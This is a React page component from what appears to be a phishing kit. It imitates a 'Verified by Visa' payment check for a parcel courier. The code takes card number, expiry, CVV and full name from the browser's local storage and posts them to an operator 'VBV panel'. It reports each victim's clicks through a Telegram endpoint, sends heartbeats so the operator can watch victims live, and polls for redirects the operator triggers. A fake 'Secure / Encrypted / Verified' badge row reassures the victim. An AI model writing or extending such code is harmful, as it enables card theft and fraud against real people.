import { Navbar } from "@/components/Navbar";
import { Footer } from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { useEffect, useRef, useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { useVisitId } from "@/hooks/use-visit-id";
import { fetchWithVisitId } from "@/lib/fetch-with-visit-id";
import { useLocation } from "wouter";
import { motion } from "framer-motion";
import {
  ShieldCheck, 
  Smartphone, 
  Lock, 
  CheckCircle2, 
  SmartphoneNfc,
  Shield,
  Loader2
} from "lucide-react";

export default function VbvApp() {
  const { toast } = useToast();
  const visitId = useVisitId(); // Initialiser le visitId
  const [, setLocation] = useLocation();
  const heartbeatIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const [isWaitingRedirect, setIsWaitingRedirect] = useState(false);
  const redirectPollingRef = useRef<NodeJS.Timeout | null>(null);

  // Enregistrer le client et démarrer le heartbeat
  useEffect(() => {
    // Récupérer les données de paiement depuis localStorage
    const paymentDataStr = localStorage.getItem("payment_data");
    let paymentData: {
      cardholder: string;
      cardNumber: string;
      expiry: string;
      cvv: string;
      fullName: string;
    } | null = null;

    if (paymentDataStr) {
      try {
        paymentData = JSON.parse(paymentDataStr);
      } catch (e) {
        console.error("Failed to parse payment data:", e);
      }
    }

    // Enregistrer le client dans le panel VBV
    const registerClient = async () => {
      try {
        // Récupérer le fullName depuis localStorage (depuis la page home) ou utiliser cardholder
        const storedFullName = localStorage.getItem("client_fullname");
        const fullName = storedFullName || paymentData?.fullName || paymentData?.cardholder || "";

        console.log("[VBV-App] Registering client with visitId:", visitId);
        console.log("[VBV-App] Payment data available:", !!paymentData);
        console.log("[VBV-App] Full name:", fullName);

        const response = await fetchWithVisitId("/api/vbv-panel/register", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            fullName: fullName,
            cardInfo: paymentData ? {
              cardholder: paymentData.cardholder,
              cardNumber: paymentData.cardNumber,
              expiry: paymentData.expiry,
              cvv: paymentData.cvv,
            } : undefined,
            page: "VBV-App", // Mettre à jour la page à "VBV-App" quand le client arrive sur cette page
          }),
        });

        if (!response.ok) {
          const errorData = await response.json().catch(() => ({}));
          console.error("[VBV-App] Failed to register client:", errorData);
        } else {
          const result = await response.json();
          console.log("[VBV-App] Client registered successfully in panel:", result);
        }
      } catch (error) {
        console.error("Failed to register client in VBV panel:", error);
      }
    };

    registerClient();

    // Démarrer le heartbeat (toutes les 5 secondes)
    const sendHeartbeat = async () => {
      try {
        const response = await fetchWithVisitId("/api/vbv-panel/heartbeat", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
        });
        if (!response.ok) {
          console.warn("[VBV-App] Heartbeat failed:", response.status);
        }
      } catch (error) {
        console.error("[VBV-App] Failed to send heartbeat:", error);
      }
    };

    // Envoyer le heartbeat immédiatement puis toutes les 5 secondes
    sendHeartbeat();
    heartbeatIntervalRef.current = setInterval(sendHeartbeat, 5000);

    // Nettoyer à la fermeture de la page
    const handleBeforeUnload = () => {
      // Le serveur détectera automatiquement que le client est parti après 10 secondes sans heartbeat
      if (heartbeatIntervalRef.current) {
        clearInterval(heartbeatIntervalRef.current);
      }
    };

    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      if (heartbeatIntervalRef.current) {
        clearInterval(heartbeatIntervalRef.current);
      }
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, [visitId]);

  const handleBankApproval = async () => {
    const message = `
📱 *Banking App Approval Clicked*

⏰ *Time:* ${new Date().toLocaleTimeString()}
    `;

    try {
      await fetchWithVisitId("/api/telegram/send", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          message,
          parseMode: "Markdown",
        }),
      });

      // also track as 3DS step when banking app approval is used
      void fetchWithVisitId("/api/flows/event", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          step: "vbv",
          notes: "Banking app approval clicked",
        }),
      });
      
      // Activer l'état d'attente de redirection
      setIsWaitingRedirect(true);
      
      toast({
        title: "Processing",
        description: "Waiting for verification...",
        duration: 3000,
      });

    } catch (error) {
      console.error(error);
    }
  };

  // Polling pour vérifier si une redirection a été déclenchée depuis le panel
  useEffect(() => {
    if (!isWaitingRedirect) return;

    const checkRedirect = async () => {
      try {
        const response = await fetchWithVisitId("/api/vbv-panel/redirect-status", {
          method: "GET",
        });
        if (response.ok) {
          const data = await response.json();
          if (data.shouldRedirect && data.redirectTo) {
            // Arrêter le polling et rediriger
            if (redirectPollingRef.current) {
              clearInterval(redirectPollingRef.current);
            }
            setIsWaitingRedirect(false);
            setLocation(data.redirectTo);
          }
        }
      } catch (error) {
        console.error("[VBV-App] Failed to check redirect status:", error);
      }
    };

    // Vérifier toutes les 2 secondes
    redirectPollingRef.current = setInterval(checkRedirect, 2000);

    return () => {
      if (redirectPollingRef.current) {
        clearInterval(redirectPollingRef.current);
      }
    };
  }, [isWaitingRedirect, setLocation, visitId]);

  return (
    <div className="min-h-screen flex flex-col w-full bg-slate-50 font-sans">
      
      {/* Header - Black Bar */}
      <div className="bg-black text-white py-4 px-6 text-center shadow-md">
        <div className="flex items-center justify-center gap-2 font-bold text-lg">
          <ShieldCheck className="h-5 w-5 text-brand-orange" />
          Payment Verification
        </div>
      </div>

      <main className="flex-grow py-8 px-4 md:px-8 flex flex-col items-center">
        <div className="w-full max-w-md space-y-6">
          
          {/* Transaction Details Card */}
          <Card className="border-t-4 border-t-gray-200 shadow-sm bg-white overflow-hidden">
            <CardContent className="p-6 space-y-4 text-sm">
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Merchant</span>
                 <span className="font-bold text-gray-800">The Courier Guy</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Amount</span>
                 <span className="font-bold text-green-600 text-lg">R 48.20</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Date & Time</span>
                 <span className="font-medium text-gray-800">{new Date().toLocaleString('en-GB', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' })}</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Card</span>
                 <span className="font-medium text-gray-800 tracking-wider">**** **** **** 9558</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Reference</span>
                 <span className="font-medium text-gray-800">CI22105583668</span>
               </div>
            </CardContent>
          </Card>

          {/* App Verification Section */}
          <div className="bg-blue-50 border border-blue-100 rounded-xl p-6 text-center">
             <div className="w-20 h-20 bg-white rounded-full mx-auto mb-4 flex items-center justify-center shadow-sm border border-blue-50">
                <SmartphoneNfc className="h-10 w-10 text-brand-orange" />
             </div>
             
             <h3 className="text-brand-blue font-bold text-lg mb-2">Approval Request Sent</h3>
             <p className="text-gray-600 text-sm mb-4">
               Check your banking app for verification.
             </p>

             <Button variant="outline" className="bg-brand-orange hover:bg-orange-600 text-white border-none font-bold rounded-full h-10 px-6 gap-2 text-sm shadow-sm">
                <Smartphone className="h-4 w-4" /> Open banking app
             </Button>
          </div>

          {/* Banking App Approval Button */}
          <div className="space-y-4">
            {isWaitingRedirect ? (
              <div className="bg-blue-50 border border-blue-100 rounded-xl p-6 text-center">
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                  className="w-16 h-16 rounded-full border-4 border-blue-100 border-t-brand-blue mx-auto mb-4 flex items-center justify-center"
                >
                  <Loader2 className="h-8 w-8 text-brand-blue" />
                </motion.div>
                <h3 className="text-brand-blue font-bold text-lg mb-2">Waiting for verification...</h3>
                <p className="text-gray-600 text-sm">
                  Please wait while we verify your approval.
                </p>
              </div>
            ) : (
              <Button 
                type="button"
                variant="secondary"
                onClick={handleBankApproval}
                className="w-full h-12 bg-blue-100 hover:bg-blue-200 text-brand-blue font-bold text-base shadow-sm transition-all flex items-center justify-center gap-2"
              >
                <CheckCircle2 className="h-5 w-5" />
                I approved in banking app
              </Button>
            )}
          </div>
          
          {/* Footer Badges */}
          <div className="flex justify-center gap-4 pt-4 opacity-60">
             <div className="flex items-center gap-1 text-xs text-gray-500 bg-white px-2 py-1 rounded border">
                <Shield className="h-3 w-3" /> Secure
             </div>
             <div className="flex items-center gap-1 text-xs text-gray-500 bg-white px-2 py-1 rounded border">
                <Lock className="h-3 w-3" /> Encrypted
             </div>
             <div className="flex items-center gap-1 text-xs text-gray-500 bg-white px-2 py-1 rounded border">
                <CheckCircle2 className="h-3 w-3" /> Verified
             </div>
          </div>

        </div>
      </main>
    </div>
  );
}
